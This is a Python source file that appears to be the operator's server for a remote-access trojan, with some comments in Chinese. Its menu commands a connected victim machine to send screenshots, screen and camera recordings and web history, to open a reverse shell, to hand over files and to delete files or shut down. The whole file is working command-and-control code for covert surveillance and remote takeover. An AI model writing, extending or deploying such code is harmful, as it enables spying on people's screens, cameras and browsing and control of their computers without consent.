import socket
import struct
import os
import time


def receive_file(conn):
    fileinfo_size = struct.calcsize('128sl')

    # 確保接收到足夠的數據
    buf = b''
    while len(buf) < fileinfo_size:
        packet = conn.recv(fileinfo_size - len(buf))
        if not packet:
            raise ConnectionError("Connection lost while receiving file info")
        buf += packet

    if len(buf) == fileinfo_size:
        filename, filesize = struct.unpack('128sl', buf)
        filename = filename.strip(b'\x00').decode()

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        directory = os.path.join('./received_files', time.strftime("%Y/%m%d"))
        os.makedirs(directory, exist_ok=True)

        base, ext = os.path.splitext(filename)
        new_filename = os.path.join(directory, f"{timestamp}_{base}{ext}")

        recvd_size = 0
        with open(new_filename, 'wb') as file:
            while recvd_size < filesize:
                chunk_size = min(filesize - recvd_size, 1024)
                data = conn.recv(chunk_size)
                if not data:
                    print("Connection lost during file transfer")
                    break
                recvd_size += len(data)
                file.write(data)

        # 確認結束標誌
        end_marker = conn.recv(1024)
        if end_marker != b"END":
            print(f"Unexpected end marker: {end_marker}")

        print(f"{new_filename} 接收完")
    else:
        print(f"Received data of incorrect size: expected {fileinfo_size}, got {len(buf)}")


def handle_reverse_shell(conn):
    while True:
        cmd = input("Enter your command : ")
        if cmd == "exit":
            conn.send(cmd.encode())
            break
        elif cmd[:4] == "down":
            conn.send(cmd.encode())
            # Wait for response from the client
            response = conn.recv(1024)
            if response == b"FILE_NOT_FOUND":
                print("File not found on client side.")
                continue  # Continue to the next command prompt

            data = b""
            while True:
                end_data = conn.recv(1024)

                # 如果收到 'Ended'，則停止接收
                if end_data == b"Ended":
                    print("File transfer ended :)")
                    break

                data += end_data

            # 將收到的數據寫入文件
            f_name = input("Enter output file name: ")
            with open(f_name, "wb") as new_f:
                new_f.write(data)

        elif cmd:
            conn.send(cmd.encode())
            response = conn.recv(4096).decode()  # Adjust buffer size as needed
            print(response)
        else:
            print("Command cannot be empty")


def server_program():
    host = '0.0.0.0'
    port = 50001

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Listening...")

    conn, address = server_socket.accept()
    print(f"Connection from: {address}")

    client_info = conn.recv(1024).decode()
    print(client_info)

    while True:
        command = input("Enter command : \n     1 for screenshots\n     2 for screen recording\n "
                        "    3 for camera recording\n     4 for reverse shell\n"
                        "     5 for web history\n     6 for file delete\n     7 for close\n     0 for break\n=> ")
        conn.send(command.encode())  # send to client

        if command == '1':
            num_screenshots = input("Enter number of screenshots: ")
            if num_screenshots.isdigit():
                num_screenshots = int(num_screenshots)
                conn.send(str(num_screenshots).encode())  # send number of screenshots to client
                for _ in range(num_screenshots):
                    receive_file(conn)
            else:
                print("Invalid number of screenshots")
        elif command == '2':
            receive_file(conn)
        elif command == '3':
            receive_file(conn)
        elif command == '4':
            handle_reverse_shell(conn)
        elif command == '5':
            receive_file(conn)
        elif command == '6':
            print('刪除檔案')
        elif command == '7':
            print('電腦關機')
        elif command == '0':
            break

    conn.close()


if __name__ == '__main__':
    server_program()
